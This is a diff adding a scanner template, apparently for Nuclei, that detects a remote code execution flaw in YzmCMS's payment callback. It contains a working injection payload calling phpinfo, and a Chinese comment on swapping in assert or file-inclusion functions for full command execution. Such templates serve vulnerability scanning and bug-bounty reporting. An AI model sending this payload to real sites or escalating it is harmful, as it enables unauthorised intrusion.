@@ -1,0 +1,25 @@
+id: yzmcms-callback-rce
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: YzmCMS pay_callback.html存在远程命令执行漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /pay/index/pay_callback.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+
+        out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PHP Version'
+#说明：out_trade_no[2]处接函数名。out_trade_no[1]处接参数值。rce需尝试assert函数或其他文件包含函数自行研究。补天提交证明代码执行即可。
